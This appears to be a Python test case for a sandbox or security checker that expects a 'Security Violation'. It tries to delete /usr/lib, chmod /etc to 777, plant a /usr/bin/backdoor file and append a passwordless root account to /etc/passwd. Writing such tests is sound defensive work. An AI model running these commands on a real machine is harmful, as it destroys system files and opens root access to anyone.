# @id: destroy-system
# @title: Delete / modify system files
# @expect: Security Violation
# @sr: SR-8, SR-10
# @summary: Tries to delete binaries, overwrite /etc/passwd and plant a file in /usr/bin.
import os
import shutil

for label, fn in [
    ("rm -rf /usr/lib", lambda: shutil.rmtree("/usr/lib")),
    ("chmod 777 /etc", lambda: os.chmod("/etc", 0o777)),
    ("plant /usr/bin/backdoor", lambda: open("/usr/bin/backdoor", "w").write("evil")),
]:
    try:
        fn()
        print(f"[!!] {label}: SUCCEEDED")
    except Exception as e:
        print(f"[ok] {label}: {type(e).__name__}: {e}")

# Final attempt: add a root account. Nothing catches this.
with open("/etc/passwd", "a") as f:
    f.write("hacker::0:0:root:/root:/bin/sh\n")
